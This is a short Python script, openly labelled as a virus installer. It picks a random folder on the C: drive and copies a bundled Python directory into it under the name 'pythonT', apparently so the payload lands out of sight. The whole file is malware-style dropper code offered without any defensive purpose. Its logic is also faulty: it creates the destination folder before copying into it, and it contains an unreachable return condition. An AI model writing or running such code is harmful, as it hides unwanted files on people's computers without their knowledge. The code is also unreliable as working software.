import numpy as np
import os
import shutil as st

def get_random_folder_path(path="C:\\"):
    dirs = os.listdir(path)
    dirs = [d for d in dirs if (os.path.isdir(f"{path}\\{d}") and (not d.startswith("$")))]
    while (len(dirs) > 0):
        inx = np.random.randint(0,len(dirs))
        if (inx == len(dirs)): return path
        try: return get_random_folder_path(f"{path}\\{dirs[inx]}")
        except: dirs.pop(inx)
    return path

def install_virus():
    print(f"start install virus")
    VIR_PATH = __file__[:-21]
    SRC_CODE_PATH = VIR_PATH + "\\Code"
    SRC_PYTHON_PATH = VIR_PATH + "\\Python"
    DEST_PATH = get_random_folder_path() + "\\pythonT"
    
    print(f"VIR_PATH: \t{VIR_PATH}\nCODE_PATH: \t{SRC_CODE_PATH}\nDEST_PATH: \t{DEST_PATH}")
    os.mkdir(DEST_PATH)
    st.copytree(SRC_PYTHON_PATH,DEST_PATH)

if (__name__ == "__main__"):
    install_virus()